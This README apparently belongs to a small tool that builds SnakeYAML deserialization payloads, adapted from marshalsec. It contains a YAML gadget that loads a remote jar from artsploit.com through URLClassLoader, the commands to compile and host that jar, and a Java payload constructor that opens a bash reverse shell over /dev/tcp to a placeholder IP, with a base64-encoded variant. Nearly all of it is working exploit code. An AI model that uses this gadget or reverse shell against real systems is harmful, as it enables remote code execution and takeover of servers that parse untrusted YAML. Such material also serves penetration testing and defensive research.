A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
Put the java code you want execute into [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) and compile:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Then place the 'yaml-payload.jar' file in to the web server folder (e.g. artsploit.com/yaml-payload.jar)

Shell Payload
```
public AwesomeScriptEngineFactory() {
        String[] cmd = { "bash", "-c", "bash -i >& /dev/tcp/x.x.x.x/16881 0>&1" };
        String[] jex = { "bash", "-c", "{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}" };
        try {
            Runtime.getRuntime().exec(cmd);
            Runtime.getRuntime().exec(jex);
            Runtime.getRuntime().exec("echo $jex");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
